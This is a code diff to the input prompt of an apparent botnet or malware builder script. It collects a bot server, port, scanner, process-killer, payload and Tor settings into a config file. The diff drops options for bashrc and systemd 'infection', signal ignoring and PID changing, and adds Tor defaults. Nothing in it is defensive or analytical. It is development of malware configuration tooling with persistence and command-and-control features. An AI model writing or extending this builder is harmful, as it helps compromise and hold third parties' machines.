@@ -26,6 +26,8 @@ def getinput():
             bot_server = "disable"
             bot_port = "disable"            
     else:
+        tor_server = "disable"
+        tor_port = "disable"
         bot_server = input("[6/19] Bot server (ex. 127.0.0.1):\n")
         handleinput(bot_server)
          
@@ -60,18 +62,7 @@ def getinput():
 
     handleinput(maxcpu_u)
 
-    ignore_signals = input(
-        "[13/19] Ignore signals (true/false):\n")
 
-    handleinput(ignore_signals)
-
-    if ignore_signals == "true":
-        pid_changer = input(
-            "[14/19] Pid changer (true/false):\n")
-
-        handleinput(pid_changer)
-    else:
-        pid_changer = "false"
 
     killer_enabled = input(
         "[15/19] Killer enabled (true/false):\n")
@@ -93,18 +84,11 @@ def getinput():
         max_killed_pid = 0
         min_killer_pid = 0
 
-    bashrc_inf = input(
-        "[18/19] Bashrc infection enabled (true/false):\n")
 
-    handleinput(bashrc_inf)
 
-    sysd_inf = input(
-        "[19/19] Systemd infection enabled (true/false):\n")
+    res = f"{bot_server}\\\\{bot_port}\\\\{scanner_enabled}\\\\{scanner_mcpu}\\\\{maxcpu_u}\\\\{debug}\\\\{min_killer_pid}|{max_killed_pid}\\\\{killer_enabled}\\\\{payload}\\\\{tor_server}\\\\{tor_port}\\\\{tor_enabled}"
 
-    handleinput(sysd_inf)
-
-    res = f"{bot_server}\\\\{bot_port}\\\\{ignore_signals}\\\\{scanner_enabled}\\\\{scanner_mcpu}\\\\{maxcpu_u}\\\\{pid_changer}\\\\{debug}\\\\{min_killer_pid}|{max_killed_pid}\\\\{killer_enabled}\\\\{bashrc_inf}\\\\{sysd_inf}\\\\{payload}\\\\{tor_server}\\\\{tor_port}\\\\{tor_enabled}"
-
+    print(res)
     chdir("./enc/")
 
     with io.open(".temp_config", 'w', encoding='utf-8') as file:
